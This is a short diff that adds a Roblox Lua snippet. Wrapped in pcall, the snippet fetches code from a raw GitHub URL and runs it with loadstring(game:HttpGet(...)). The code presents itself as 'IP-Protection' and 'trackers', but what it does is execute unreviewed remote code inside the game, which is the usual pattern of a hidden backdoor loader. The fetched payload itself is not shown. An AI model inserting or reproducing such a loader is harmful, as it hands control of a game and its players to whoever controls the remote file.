@@ -1,0 +1,6 @@
+pcall(function()
+local project = "IP-Protection"
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/qvrwd/storage/main/protection/trackers"):format(project), true))()
+end)
+
+wait(0.1)
